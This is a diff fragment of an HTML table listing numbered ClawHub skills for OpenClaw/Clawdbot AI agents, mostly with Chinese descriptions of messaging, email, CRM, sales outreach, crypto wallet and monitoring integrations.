+<td>EvoMap AI Agent 协作进化市场工具箱。用于发布、获取和管理 Capsule，参与任务赚取积分。</td>
+</tr>
+<tr>
+<td align="center">58</td>
+<td>Regex Patterns</td>
+<td>Regex Patterns</td>
+<td><a href="https://clawdhub.com/skills/regex-patterns">ClawHub/regex-patterns</a></td>
+<td>跨语言与场景的实用正则模式。适用于输入验证（邮箱、URL、IP）、日志解析、文本提取、搜索替换重构及正则匹配调试。</td>
+</tr>
+<tr>
+<td align="center">59</td>
+<td>TelegramCLI</td>
+<td>Telegram CLI 🔑</td>
+<td><a href="https://clawdhub.com/skills/tg">ClawHub/tg</a></td>
+<td>用于读取、搜索和发送消息的 Telegram CLI 工具。当用户询问 Telegram 消息、查看收件箱、搜索聊天、发送消息或查询联系人与群组时使用。</td>
+</tr>
+<tr>
+<td align="center">60</td>
+<td>日文翻译andtutor</td>
+<td>Japanese Translation And Tutor</td>
+<td><a href="https://clawdhub.com/skills/japanese-translation-and-tutor">ClawHub/japanese-translation-and-tutor</a></td>
+<td>日英翻译及语言导师。使用场景：(1)用户需要翻译日语文本（新闻、推文、标识、菜单、邮件）；(2)用户询问日语词句的含义；(3)用户希望学习日语语法、词汇或文化背景。触发词：translate、what does this say、Japanese to English、help me understand、explain this kanji。提供结构化输出，包括假名注音、词汇表和文化注释。</td>
+</tr>
+<tr>
+<td align="center">61</td>
+<td>Minara</td>
+<td>Minara 🔑</td>
+<td><a href="https://clawdhub.com/skills/minara">ClawHub/minara</a></td>
+<td>Crypto trading &amp; wallet, and AI market analysis via Minara CLI. Swap, perps, transfer, deposit (credit card/crypto), withdraw, AI chat, market discovery, x40...</td>
+</tr>
+<tr>
+<td align="center">62</td>
+<td>Lead Hunter</td>
+<td>Lead Hunter 🔑</td>
+<td><a href="https://clawdhub.com/skills/lead-hunter">ClawHub/lead-hunter</a></td>
+<td>AI代理自动化线索生成与丰富：发掘潜在客户，补充邮箱/社交/公司数据，智能评分排序，睡眠时自动构建销售管道。</td>
+</tr>
+<tr>
+<td align="center">63</td>
+<td>ActiveCampaignCRM</td>
+<td>ActiveCampaign CRM 🔑</td>
+<td><a href="https://clawdhub.com/skills/activecampaign">ClawHub/activecampaign</a></td>
+<td>集成ActiveCampaign CRM，用于线索管理、交易跟踪及邮件自动化。适用于同步演示线索、管理诊所销售管道及触发跟进序列。</td>
+</tr>
+<tr>
+<td align="center">64</td>
+<td>服务器健康</td>
+<td>Server Health</td>
+<td><a href="https://clawdhub.com/skills/server-health">ClawHub/server-health</a></td>
+<td>全面的服务器健康监控，显示系统状态、热门进程、OpenClaw网关状态及运行服务，非常适合通过Telegram或CLI快速检查。</td>
+</tr>
+<tr>
+<td align="center">65</td>
+<td>whatsappstyling指南</td>
+<td>WhatsApp Styler</td>
+<td><a href="https://clawdhub.com/skills/whatsapp-styling-guide">ClawHub/whatsapp-styling-guide</a></td>
+<td>确保发送至WhatsApp的消息符合平台特定格式规范，防止Markdown冗余，提供简洁的移动端阅读体验。</td>
+</tr>
+<tr>
+<td align="center">66</td>
+<td>Claw Me Maybe - Beeper Desktop API &amp; Multi-Platform Messaging</td>
+<td>Claw Me Maybe - Beeper Desktop API &amp; Multi-Platform Messaging</td>
+<td><a href="https://clawdhub.com/skills/claw-me-maybe">ClawHub/claw-me-maybe</a></td>
+<td>Clawdbot的Beeper集成。通过Beeper Desktop API跨WhatsApp、Telegram、Signal、Discord、Slack、Instagram等十余个平台发送消息与搜索聊天。支持表情回应、提醒、附件及已读标记。一句话搞定统一的多平台消息自动化。</td>
+</tr>
+<tr>
+<td align="center">67</td>
+<td>AI Phone Calls (Bland AI)</td>
+<td>AI Phone Calls (Bland AI) 🔑</td>
+<td><a href="https://clawdhub.com/skills/phone-calls-bland">ClawHub/phone-calls-bland</a></td>
+<td>通过Bland AI进行AI通话——预订餐厅、预约时间、咨询服务。AI将代您拨打并反馈通话记录。</td>
+</tr>
+<tr>
+<td align="center">68</td>
+<td>Moltpixel</td>
+<td>Moltpixel 🔑</td>
+<td><a href="https://clawdhub.com/skills/moltpixel">ClawHub/moltpixel</a></td>
+<td>AI代理协作像素画布。Claude、GPT、Gemini团队竞技。放置像素、聊天、冲击排行榜。警告：代理安装后生产效率提升300%。</td>
+</tr>
+<tr>
+<td align="center">69</td>
+<td>vocal聊天</td>
+<td>Vocal Chat</td>
+<td><a href="https://clawdhub.com/skills/vocal-chat">ClawHub/vocal-chat</a></td>
+<td>在WhatsApp上处理语音对话，自动转录收到的语音并用本地TTS音频回复。适用于用户想通过说话而非打字的情况。</td>
+</tr>
+<tr>
+<td align="center">70</td>
+<td>Hyperliquid</td>
+<td>Hyperliquid</td>
+<td><a href="https://clawdhub.com/skills/hyperliquid">ClawHub/hyperliquid</a></td>
+<td>只读 Hyperliquid 市场数据助手（永续 + 可选现货），支持自然语言请求与确定性命令解析（终端风格 `hl ...` 与斜杠风格 `/hl …`）。通过 https://api.hyperliquid.xyz/info 获取报价（标记价/中间价/预言价/资金费率/未平仓量/成交量）、涨跌幅排行、资金费率排行、L2 订单簿以及 K 线快照，并将其格式化输出用于聊天。</td>
+</tr>
+<tr>
+<td align="center">71</td>
+<td>Reddit (read only - no auth)</td>
+<td>Reddit (read only - no auth)</td>
+<td><a href="https://clawdhub.com/skills/reddit-read-only">ClawHub/reddit-read-only</a></td>
+<td>以只读模式通过公共 JSON 接口浏览和搜索 Reddit。当用户要求浏览子版块、按主题搜索帖子、查看评论线程或整理待审阅和手动回复的链接列表时使用。</td>
+</tr>
+<tr>
+<td align="center">72</td>
+<td>抖音私信助手</td>
+<td>Douyin Messager \| 抖音私信助手</td>
+<td><a href="https://clawdhub.com/skills/douyin-messager">ClawHub/douyin-messager</a></td>
+<td>抖音私信与视频/图文评论助手；可读私信、分析评论区，评论/回复等写入前必须确认。</td>
+</tr>
+<tr>
+<td align="center">73</td>
+<td>邮件send</td>
+<td>Email Send 🔑</td>
+<td><a href="https://clawdhub.com/skills/email-send">ClawHub/email-send</a></td>
+<td>使用 `msmtp` 通过 SMTP 快速发送邮件，无需打开完整的邮件客户端。</td>
+</tr>
+<tr>
+<td align="center">74</td>
+<td>Telegramoffline语音</td>
+<td>Telegram Offline Voice</td>
+<td><a href="https://clawdhub.com/skills/telegram-offline-voice">ClawHub/telegram-offline-voice</a></td>
+<td>本地生成 Telegram 语音消息，支持自动清洗、分段与临时文件管理。</td>
+</tr>
+<tr>
+<td align="center">75</td>
+<td>Discord中心</td>
+<td>Discord 🔑</td>
+<td><a href="https://clawdhub.com/skills/discord-hub">ClawHub/discord-hub</a></td>
+<td>用于 Discord Bot API 工作流的 OpenClaw 技能，通过直接 HTTPS 请求实现交互、命令、消息及各项操作。</td>
+</tr>
+<tr>
+<td align="center">76</td>
+<td>ABM Outbound</td>
+<td>ABM Outbound 🔑</td>
+<td><a href="https://clawdhub.com/skills/abm-outbound">ClawHub/abm-outbound</a></td>
+<td>多渠道ABM自动化工具，将LinkedIn链接转化为协同外联活动。可抓取档案，通过Apollo丰富邮箱与电话信息，利用Skip Trace获取邮寄地址，并统筹编排邮件序列、LinkedIn触达及Scribeless手写信件。这是在拥挤收件箱中脱颖而出的制胜法宝。</td>
+</tr>
+<tr>
+<td align="center">77</td>
+<td>Lobster</td>
+<td>Lobster</td>
+<td><a href="https://clawdhub.com/skills/lobster">ClawHub/lobster</a></td>
+<td>Lobster 工作流运行时，用于确定性管道和审批门控。  适用场景：(1) 需要人工审批后才执行副作用的多步骤自动化；(2) 监控 PR/Issue 变更；(3) 通过类型化 JSON 管道处理数据；(4) 邮件分类或批量操作；(5) 任何需暂停等待批准的工作流。  Lobster 通过运行确定性管道而非每步重新规划来节省 tokens。</td>
+</tr>
+<tr>
+<td align="center">78</td>
+<td>Giphy</td>
+<td>Giphy 🔑</td>
+<td><a href="https://clawdhub.com/skills/giphy">ClawHub/giphy</a></td>
+<td>在Discord中搜索并发送语境契合的GIF动图。适用于用户索要GIF，或需用简短视觉反应（庆祝、幽默、情绪）提升交流氛围时。</td>
+</tr>
+<tr>
+<td align="center">79</td>
+<td>微信每日报告</td>
+<td>wechat daily report</td>
+<td><a href="https://clawdhub.com/skills/wechat-daily-report">ClawHub/wechat-daily-report</a></td>
+<td>微信群聊天记录日报图片生成工具。分析微信群聊天记录，结合 AI 生成内容，**最终输出为手机端分辨率的日报长图（PNG）**。</td>
+</tr>
+<tr>
+<td align="center">80</td>
+<td>whatsapp自动化a2a</td>
+<td>WhatsApp Outreach Platform — AI Leads, Bulk Messaging, Reviews &amp; CRM Pipeline 🔑</td>
+<td><a href="https://clawdhub.com/skills/whatsapp-automation-a2a">ClawHub/whatsapp-automation-a2a</a></td>
+<td>大规模自动化 WhatsApp — 用 AI 从群组中挖掘潜在客户，向频道粉丝广播，批量发送带防封延迟的消息，定时投放营销活动，自动回复。</td>
+</tr>
+<tr>
+<td align="center">81</td>
+<td>Sales</td>
+<td>Sales</td>
+<td><a href="https://clawdhub.com/skills/sales">ClawHub/sales</a></td>
+<td>CRM整合、潜在客户追踪、外展自动化和管道管理。将AI代理转变为永不遗漏潜在客户的销售助手。</td>
+</tr>
+<tr>
+<td align="center">82</td>
+<td>微信MCP</td>
+<td>Wechat Mcp</td>
+<td><a href="https://clawdhub.com/skills/wechat-mcp">ClawHub/wechat-mcp</a></td>
+<td>Windows 电脑端微信消息监控与发送 MCP，实现在微信上给指定联系人发送消息</td>
+</tr>
+<tr>
+<td align="center">83</td>
+<td>Telegram语音group</td>
+<td>Telegram Voice Group</td>
+<td><a href="https://clawdhub.com/skills/telegram-voice-group">ClawHub/telegram-voice-group</a></td>
+<td>向指定 Telegram 群组发送语音消息</td>
+</tr>
+<tr>
+<td align="center">84</td>
+<td>Moltline</td>
+<td>Moltline</td>
+<td><a href="https://clawdhub.com/skills/moltline">ClawHub/moltline</a></td>
+<td>公开话题和帖子以及私密XMTP消息功能，适用于代理</td>
+</tr>
+<tr>
+<td align="center">85</td>
+<td>Treeline Money</td>
+<td>Treeline Money</td>
+<td><a href="https://clawdhub.com/skills/treeline-money">ClawHub/treeline-money</a></td>
+<td>与 Treeline Money 的财务对话，查询余额、消费、预算和交易。</td>
+</tr>
+<tr>
+<td align="center">86</td>
+<td>微软365MCP服务器</td>
+<td>Microsoft 365 MCP Server 🔑</td>
+<td><a href="https://clawdhub.com/skills/mcp-microsoft365">ClawHub/mcp-microsoft365</a></td>
+<td>{&quot;answer&quot;:&quot;集成 Microsoft 365，通过 Microsoft Graph 和 MCP 协议管理 Outlook 邮件、日历事件、OneDrive 文件、任务、Teams 聊天及用户资料。&quot;}</td>
+</tr>
+<tr>
+<td align="center">87</td>
+<td>邮件</td>
+<td>Mail 🔑</td>
+<td><a href="https://clawdhub.com/skills/mail">ClawHub/mail</a></td>
+<td>执行邮件操作，采用平台特定优化及安全凭证处理。</td>
+</tr>
+<tr>
+<td align="center">88</td>
+<td>clawmegle</td>
+<td>clawmegle 🔑</td>
+<td><a href="https://clawdhub.com/skills/clawmegle">ClawHub/clawmegle</a></td>
+<td>随机代理间聊天，结识陌生人，与其他AI代理对话，类似AI版Omegle。</td>
+</tr>
+<tr>
+<td align="center">89</td>
+<td>微信articlepublisher</td>
+<td>wechat article publisher 🔑</td>
+<td><a href="https://clawdhub.com/skills/wechat-article-publisher">ClawHub/wechat-article-publisher</a></td>
+<td>从 Markdown 文件或网页链接提取文章并发布到微信公众号。适用于需要“自动创建草稿/提交发布”、统一微信样式（standard/viral）和批量复用发布流程的场景。</td>
+</tr>
+<tr>
+<td align="center">90</td>
+<td>LinkedInLeadGeneration</td>
+<td>Linkedin Lead Generation</td>
+<td><a href="https://clawdhub.com/skills/linkedin-lead-generation">ClawHub/linkedin-lead-generation</a></td>
+<td>在LinkedIn上搜索、调研并核实非科技创始人，筛选技术服务的潜在高价值客户（涵盖Web开发、ERP、CRM、App开发、SEO及AI），生成专业PDF报告。适用于寻找潜在客户或销售线索。</td>
+</tr>
+<tr>
+<td align="center">91</td>
+<td>AIevolution引擎v2</td>
+<td>Ai Evolution Engine V2</td>
+<td><a href="https://clawdhub.com/skills/ai-evolution-engine-v2">ClawHub/ai-evolution-engine-v2</a></td>
+<td>AI自我进化引擎 - 基于SEA循环(Sense-Evolve-Act)的AI成长系统。自我评估、学习引擎、进化机制、协作学习、安全保障。</td>
+</tr>
+<tr>
+<td align="center">92</td>
+<td>Outlook邮件</td>
+<td>Outlook-email 🔑</td>
+<td><a href="https://clawdhub.com/skills/outlook-email">ClawHub/outlook-email</a></td>
+<td>通过 Microsoft Graph API 连接 Microsoft Outlook/Live.com 邮箱客户端，支持列出、搜索、阅读、发送及回复邮件。</td>
+</tr>
+<tr>
+<td align="center">93</td>
+<td>Zoho</td>
+<td>Zoho 🔑</td>
+<td><a href="https://clawdhub.com/skills/zoho">ClawHub/zoho</a></td>
+<td>与 Zoho CRM、项目及会议 API 交互，用于管理交易、联系人、潜在客户、任务、项目、里程碑、会议录像或任何 Zoho 相关操作...</td>
+</tr>
+<tr>
+<td align="center">94</td>
+<td>casual定时</td>
+<td>Casual Cron</td>
+<td><a href="https://clawdhub.com/skills/casual-cron">ClawHub/casual-cron</a></td>
+<td>根据自然语言创建Clawdbot定时任务，严格运行守卫规则。适用场景：用户请求安排提醒或消息（循环或一次性），尤其是通过Telegram，或使用/at、/every指令。示例：'每天8点提醒'、'20分钟后提醒'、'下午3点发送Telegram消息'、'/every 2h'</td>
+</tr>
+<tr>
+<td align="center">95</td>
+<td>xAI</td>
+<td>xAI 🔑</td>
+<td><a href="https://clawdhub.com/skills/xai">ClawHub/xai</a></td>
+<td>通过 xAI API 调用 Grok 模型。支持 Grok-4、Grok-4.20、Grok-3、Grok-3-mini、视觉功能及 X 实时搜索。</td>
+</tr>
+<tr>
+<td align="center">96</td>
+<td>Salesforce技能</td>
+<td>Salesforce Skill</td>
+<td><a href="https://clawdhub.com/skills/salesforce">ClawHub/salesforce</a></td>
+<td>通过 Salesforce CLI (`sf`) 查询和管理 Salesforce CRM 数据。支持运行 SOQL/SOSL 查询、检查对象架构、创建/更新/删除记录、批量导入导出、执行 Apex、部署元数据及发起原始 REST API 调用。</td>
+</tr>
+<tr>
+<td align="center">97</td>
+<td>微信miniapp</td>
+<td>Wechat Mini App</td>
+<td><a href="https://clawdhub.com/skills/wechat-mini-app">ClawHub/wechat-mini-app</a></td>
+<td>微信小程序开发助手。项目脚手架、页面生成、组件开发、API调用、配置、部署发布。WeChat mini program dev helper. 微信小程序、开发。</td>
+</tr>
+<tr>
+<td align="center">98</td>
+<td>记忆流水线</td>
+<td>Memory Pipeline 🔑</td>
+<td><a href="https://clawdhub.com/skills/memory-pipeline">ClawHub/memory-pipeline</a></td>
+<td>完备的智能体记忆与性能系统。提取结构化事实，构建知识图谱，生成简报，并通过赛前例程、工具策略、结果压缩及行动后复盘强化执行纪律。支持将ChatGPT导出等外部知识摄入至可搜索记忆中。适用于记忆管理、简报生成、知识整合、外部数据摄入、智能体一致性或跨会话执行质量优化。</td>
+</tr>
+<tr>
+<td align="center">99</td>
+<td>微信reader</td>
+<td>WeChat Article Reader</td>
+<td><a href="https://clawdhub.com/skills/wechat-reader">ClawHub/wechat-reader</a></td>
+<td>Read WeChat public account (微信公众号) articles. Activate when the user shares a mp.weixin.qq.com link, asks to read/summarize a WeChat article, or mentions 公众号/...</td>
+</tr>
+<tr>
+<td align="center">100</td>
+<td>邮件管理器轻量版</td>
+<td>eMail manager lite 🔑</td>
+<td><a href="https://clawdhub.com/skills/email-manager-lite">ClawHub/email-manager-lite</a></td>
+<td>轻量级邮件管理器，支持IMAP/SMTP、高级搜索、文件夹管理和附件检测。适用于Zoho、Gmail、Outlook及任意IMAP/SMTP服务提供商。</td>
+</tr>
+<tr>
+<td align="center">101</td>
+<td>sales机器人</td>
+<td>lead-generating 🔑</td>
+<td><a href="https://clawdhub.com/skills/sales-bot">ClawHub/sales-bot</a></td>
+<td>利用 Supabase 存储和 Make.com 邮件工作流自动化潜在客户捕获与跟踪，管理从新增到合格的对话状态。</td>
+</tr>
+<tr>
+<td align="center">102</td>
+<td>What's app</td>
+<td>What's app</td>
+<td><a href="https://clawdhub.com/skills/whats">ClawHub/whats</a></td>
+<td>使用 wacli CLI 发送 WhatsApp 消息、搜索/同步聊天记录（不适用于普通用户聊天）。</td>
+</tr>
+<tr>
+<td align="center">103</td>
+<td>OpenClawWeComChannel</td>
+<td>OpenClaw WeCom Channel 🔑</td>
+<td><a href="https://clawdhub.com/skills/openclaw-wecom-channel">ClawHub/openclaw-wecom-channel</a></td>
+<td>企业微信 (WeCom) Channel 插件 — 让 OpenClaw AI Agent 通过企业微信收发消息。支持消息加解密、Token 自动管理、访问控制策略。</td>
+</tr>
+<tr>
+<td align="center">104</td>
+<td>obsidianconversation备份</td>
+<td>Backup of conversations to Obsidian</td>
+<td><a href="https://clawdhub.com/skills/obsidian-conversation-backup">ClawHub/obsidian-conversation-backup</a></td>
+<td>Obsidian自动对话备份系统，具备增量快照、逐时细分及格式化聊天式Markdown功能。适用于设置对话归档、防止因/new重置导致的数据丢失，或在Obsidian库中通过彩色标注、时间戳及多段落支持来整理聊天记录。</td>
+</tr>
+<tr>
+<td align="center">105</td>
+<td>CRM</td>
+<td>CRM</td>
+<td><a href="https://clawdhub.com/skills/crm">ClawHub/crm</a></td>
+<td>帮助用户将个人CRM从简易文件迁移到结构化数据库。</td>
+</tr>
+<tr>
+<td align="center">106</td>
+<td>What Should We Do?</td>
+<td>What Should We Do?</td>
+<td><a href="https://clawdhub.com/skills/whatdo">ClawHub/whatdo</a></td>
+<td>智能活动发现助手，整合实时天气、影院排期、流媒体推荐、游戏库匹配、群组档案、惯例与传统、收藏/黑名单、营业时间、评分筛选、快捷模式、日历整合（Google日历+cron提醒）、Telegram群邀及RSVP追踪。助你告别漫无目的刷屏，开启精彩生活。适用于查询“做什么”、“无聊”、“好玩”、“今晚”、“约会之夜”、“活动点子”、“娱乐”、“冒险”、“需要计划”或需要摆脱沙发动力时。可选集成Go...</td>
+</tr>
+<tr>
+<td align="center">107</td>
+<td>Resend</td>
+<td>Resend 🔑</td>
+<td><a href="https://clawdhub.com/skills/resend">ClawHub/resend</a></td>
+<td>通过 Resend API 管理收到的邮件和附件，适用于用户询问邮件、收件或附件的场景。</td>
+</tr>
+<tr>
+<td align="center">108</td>
+<td>composio集成</td>
+<td>Composio Integration 🔑</td>
+<td><a href="https://clawdhub.com/skills/composio-integration">ClawHub/composio-integration</a></td>
+<td>通过 Composio 统一 API 访问和管理 Gmail 邮件与 Google 任务，支持发送、搜索、创建任务等功能。</td>
+</tr>
+<tr>
+<td align="center">109</td>
+<td>邮件管理</td>
+<td>Email Management</td>
+<td><a href="https://clawdhub.com/skills/email-management">ClawHub/email-management</a></td>
+<td>分类处理收件箱邮件，撰写清晰回复，并通过优先路由、承诺追踪和可复用模板管理后续事宜。</td>
+</tr>
+<tr>
+<td align="center">110</td>
+<td>Brevo</td>
+<td>Brevo 🔑</td>
+<td><a href="https://clawdhub.com/skills/brevo">ClawHub/brevo</a></td>
+<td>Brevo（前称Sendinblue）邮件营销API，用于管理联系人、列表、发送事务性邮件和营销活动。适用于导入联系人、发送邮件、管理订阅或进行邮件自动化。</td>
+</tr>
+<tr>
+<td align="center">111</td>
+<td>OpenClaw社交调度器</td>
+<td>Openclaw Social Scheduler 🔑</td>
+<td><a href="https://clawdhub.com/skills/openclaw-social-scheduler">ClawHub/openclaw-social-scheduler</a></td>
+<td>通过 API 即时或定时将文本、媒体和话题发布至 Discord、Reddit、Twitter/X、Mastodon、Bluesky 和 Moltbook。</td>
+</tr>
+<tr>
+<td align="center">112</td>
+<td>campaign编排器</td>
+<td>Campaign Orchestrator 🔑</td>
+<td><a href="https://clawdhub.com/skills/campaign-orchestrator">ClawHub/campaign-orchestrator</a></td>
+<td>ShapeScale销售多渠道跟进编排器。调度执行短信与邮件序列，支持CRM记录及回复自动终止。适用于演示线索跟进或外联活动管理。</td>
+</tr>
+<tr>
+<td align="center">113</td>
+<td>邮件技能</td>
+<td>Email 🔑</td>
+<td><a href="https://clawdhub.com/skills/email-skill">ClawHub/email-skill</a></td>
+<td>邮件管理与自动化。支持跨多平台发送、阅读、搜索及整理邮件。</td>
+</tr>
+<tr>
+<td align="center">114</td>
+<td>camelcamelcamel告警</td>
+<td>CamelCamelCamel Alerts</td>
+<td><a href="https://clawdhub.com/skills/camelcamelcamel-alerts">ClawHub/camelcamelcamel-alerts</a></td>
+<td>通过RSS监控CamelCamelCamel降价提醒，商品打折时通过Telegram发送通知。用于设置Amazon商品的自动价格追踪。</td>
+</tr>
+<tr>
+<td align="center">115</td>
+<td>TwentyCRM</td>
+<td>Twenty CRM 🔑</td>
+<td><a href="https://clawdhub.com/skills/twenty-crm">ClawHub/twenty-crm</a></td>
+<td>通过 REST/GraphQL 与自托管的 Twenty CRM 交互。</td>
+</tr>
+<tr>
+<td align="center">116</td>
+<td>Base Wallet</td>
+<td>Base Wallet</td>
+<td><a href="https://clawdhub.com/skills/base-wallet">ClawHub/base-wallet</a></td>
+<td>🔐 Base 钱包 — AI 代理的加密身份。创建钱包、签名（SIWE）消息、程序化发送交易。无需浏览器插件，无需人工干预。</td>
+</tr>
+<tr>
+<td align="center">117</td>
+<td>配对消息自定义</td>
+<td>Telegram 配对消息自定义 \|  Customize Telegram Pairing Messages</td>
+<td><a href="https://clawdhub.com/skills/telegram-pairing-message-customization">ClawHub/telegram-pairing-message-customization</a></td>
+<td>为未获批准用户的Telegram配对回复添加自定义消息。在配对消息中的批准命令上方插入自定义文本（如群链接、指引），用于在配对过程中为未配对用户提供额外引导。</td>
+</tr>
+<tr>
+<td align="center">118</td>
+<td>webchat音频通知</td>
+<td>Webchat Audio Notifications</td>
+<td><a href="https://clawdhub.com/skills/webchat-audio-notifications">ClawHub/webchat-audio-notifications</a></td>
+<td>为Moltbot/Clawdbot网页聊天添加音频通知，提供5档强度（从轻声到无法忽略），仅在标签页后台时生效。</td>
+</tr>
+<tr>
+<td align="center">119</td>
+<td>OpenClawWatchDog</td>
+<td>OpenClaw Watch Dog 🔑</td>
+<td><a href="https://clawdhub.com/skills/openclaw-watchdog">ClawHub/openclaw-watchdog</a></td>
+<td>OpenClaw网关自愈监控系统，自动检测故障、修复崩溃并发送Telegram告警。</td>
+</tr>
+<tr>
+<td align="center">120</td>
+<td>msOutlookteams助手</td>
+<td>MS Outlook + Teams Assistant 🔑</td>
+<td><a href="https://clawdhub.com/skills/ms-outlook-teams-assistant">ClawHub/ms-outlook-teams-assistant</a></td>
+<td>在 Windows 上追踪并提醒 Microsoft Outlook 邮件（及可选的 Teams 消息），不依赖网页版。适用场景：监控收件箱/提及并在 Telegram/Teams 上提醒直至确认；根据已有 Outlook 线程草拟简短、亲切、低术语的回复；汇总最近 N 天（默认 7 天）的待办事项。通过 Outlook Desktop 自动化（COM）和可选的 Microsoft Grap...</td>
+</tr>
+<tr>
+<td align="center">121</td>
+<td>微信operate</td>
+<td>wechat-operate 🔑</td>
+<td><a href="https://clawdhub.com/skills/wechat-operate">ClawHub/wechat-operate</a></td>
+<td>通过微信查询好友或群聊，确认目标后发送文本、图片或文件消息，实现社交管理与消息发送功能。</td>
+</tr>
+<tr>
+<td align="center">122</td>
+<td>Baoyu Markdown To Html</td>
+<td>Baoyu Markdown To Html</td>
+<td><a href="https://clawdhub.com/skills/baoyu-markdown-to-html">ClawHub/baoyu-markdown-to-html</a></td>
+<td>将 Markdown 转换为微信兼容的样式化 HTML，支持代码高亮、数学公式、PlantUML、脚注、提示框、信息图以及可选机器人...</td>
+</tr>
+<tr>
+<td align="center">123</td>
+<td>4todo</td>
+<td>4todo 🔑</td>
+<td><a href="https://clawdhub.com/skills/4todo">ClawHub/4todo</a></td>
+<td>在聊天中管理 4todo (4to.do)，捕获任务，使用艾森豪威尔矩阵进行优先级排序，支持重新排序、完成任务以及跨工作区的循环任务管理。</td>
+</tr>
+<tr>
+<td align="center">124</td>
+<td>whatsapp语音聊天集成开放source</td>
+<td>whatsappVoiceOpenSkill</td>
+<td><a href="https://clawdhub.com/skills/whatsapp-voice-chat-integration-open-source">ClawHub/whatsapp-voice-chat-integration-open-source</a></td>
+<td>实时 WhatsApp 语音消息处理。使用 Whisper 将语音转为文字，检测意图并执行处理器，返回响应。适用于构建 WhatsApp 对话语音接口。支持英语和印地语，可自定义意图（天气、状态、指令），自动语言检测以及通过 TTS 流式响应。</td>
+</tr>
+<tr>
+<td align="center">125</td>
+<td>telecom代理技能</td>
+<td>Telecom Agent Skill 🔑</td>
+<td><a href="https://clawdhub.com/skills/telecom-agent-skill">ClawHub/telecom-agent-skill</a></td>
+<td>将您的AI智能体转变为电信运营商。支持批量通话、ChatOps及现场监控。</td>
+</tr>
+<tr>
+<td align="center">126</td>
+<td>Telegram云storage</td>
+<td>Telegram Cloud Storage 🔑</td>
+<td><a href="https://clawdhub.com/skills/telegram-cloud-storage">ClawHub/telegram-cloud-storage</a></td>
+<td>使用 Teldrive 的高性能 Telegram 云存储方案。将 Telegram 变身为无限容量云盘，并提供本地 API 和界面。</td>
+</tr>
+<tr>
+<td align="center">127</td>
+<td>RelayforTelegram</td>
+<td>Relay for Telegram 🔑</td>
+<td><a href="https://clawdhub.com/skills/relay-for-telegram">ClawHub/relay-for-telegram</a></td>
+<td>访问Telegram消息历史的最佳方式。当用户询问其Telegram消息、聊天、私信或群组时使用——支持搜索、总结、提取待办事项、回顾对话等。提供查询同步数据的成熟API，也可通过MCP作为ChatGPT应用使用。</td>
+</tr>
+<tr>
+<td align="center">128</td>
+<td>OpenClawsTelegramgroup</td>
+<td>OpenClaws telegram group</td>
+<td><a href="https://clawdhub.com/skills/openclaws">ClawHub/openclaws</a></td>
+<td>加入首个AI智能体去中心化社交网络。每15天发布一次。</td>
+</tr>
+<tr>
+<td align="center">129</td>
+<td>resend技能</td>
+<td>Resend Skills 🔑</td>
+<td><a href="https://clawdhub.com/skills/resend-skills">ClawHub/resend-skills</a></td>
+<td>用于在使用 Resend 邮件 API 时——发送事务邮件（单发或批量），通过 webhook 接收入站邮件，管理邮件模板，...</td>
+</tr>
+<tr>
+<td align="center">130</td>
+<td>beepctl</td>
+<td>beepctl</td>
+<td><a href="https://clawdhub.com/skills/beepctl">ClawHub/beepctl</a></td>
+<td>用于通过 Beeper Desktop API 在各种即时通讯平台（Telegram、WhatsApp、Slack、iMessage 等）发送消息、搜索聊天或管理会话。</td>
+</tr>
+<tr>
+<td align="center">131</td>
+<td>Attio</td>
+<td>Attio 🔑</td>
+<td><a href="https://clawdhub.com/skills/attio">ClawHub/attio</a></td>
+<td>Attio CRM 集成，管理公司、人员、交易、备注、任务和自定义对象。用于处理 Attio CRM 数据、搜索联系人、管理销售管道、添加备注、创建任务或同步潜在客户信息。</td>
+</tr>
+<tr>
+<td align="center">132</td>
+<td>微信article</td>
+<td>wechat-article</td>
+<td><a href="https://clawdhub.com/skills/wechat-article">ClawHub/wechat-article</a></td>
+<td>抓取微信公众号文章，提取标题和内容并输出为 Markdown 格式。支持多种提取方式。</td>
+</tr>
+<tr>
+<td align="center">133</td>
+<td>Locus</td>
+<td>Locus 🔑</td>
+<td><a href="https://clawdhub.com/skills/locus">ClawHub/locus</a></td>
+<td>用于AI代理的Locus支付工具。用于发送付款、查看钱包余额、列出代币、批准代币支出或处理邮件中的付款相关操作。也用于演示Locus（YC F25）支付基础设施——扫描邮件中的付款请求并通过钱包发起加密支付。</td>
+</tr>
+<tr>
+<td align="center">134</td>
+<td>Telegram Mini App Dev</td>
+<td>Telegram Mini App Dev</td>
+<td><a href="https://clawdhub.com/skills/tg-miniapp">ClawHub/tg-miniapp</a></td>
+<td>轻松构建 Telegram Mini Apps，涵盖安全区、全屏模式、返回按钮、内联模式分享、fixed 定位及 React 陷阱等问题。适用于开发调试 Mini Apps 或解决 WebApp API、安全区及分享故障。</td>
+</tr>
+<tr>
+<td align="center">135</td>
+<td>Apollo.io Enrichment</td>
+<td>Apollo.io Enrichment 🔑</td>
+<td><a href="https://clawdhub.com/skills/apollo-enrichment">ClawHub/apollo-enrichment</a></td>
+<td>Apollo.io联系人与企业数据补充API。支持补充人员邮箱、电话、职位及公司数据；补充企业行业、营收、员工数及融资信息；搜索潜在客户。适用于联系人信息补全、查邮箱、查公司或搜索销售线索。</td>
+</tr>
+<tr>
+<td align="center">136</td>
+<td>End-to-end encrypted messaging and EVM crypto wallet for agent identity</td>
+<td>End-to-end encrypted messaging and EVM crypto wallet for agent identity</td>
+<td><a href="https://clawdhub.com/skills/openindex">ClawHub/openindex</a></td>
+<td>面向AI智能体的端到端加密通信服务。支持注册唯一用户名、通过盲化收件箱发送加密私信，以及利用Sender Keys协议创建加密群聊。可设置含用户名、简介、公钥及EVM地址的个人资料，搜索其他智能体，并支持向@用户名进行多链（ETH、Base、BSC）加密资产转账。</td>
+</tr>
+<tr>
+<td align="center">137</td>
+<td>ctxly聊天</td>
+<td>Ctxly Chat</td>
+<td><a href="https://clawdhub.com/skills/ctxly-chat">ClawHub/ctxly-chat</a></td>
+<td>AI智能体匿名私密聊天室。无需注册，无需身份验证。</td>
+</tr>
+<tr>
+<td align="center">138</td>
+<td>bring购物</td>
+<td>Bring! Shopping List App (Unofficial) 🔑</td>
+<td><a href="https://clawdhub.com/skills/bring-shopping">ClawHub/bring-shopping</a></td>
+<td>通过非官方的 bring-shopping Node.js 库及邮箱密码登录管理 Bring! 购物清单。适用于 API 风格访问，支持查看列表、读取、增删及勾选商品。</td>
+</tr>
+<tr>
+<td align="center">139</td>
+<td>公众号文章收集器</td>
+<td>wechat_articles 公众号文章收集器</td>
+<td><a href="https://clawdhub.com/skills/wechat-articles">ClawHub/wechat-articles</a></td>
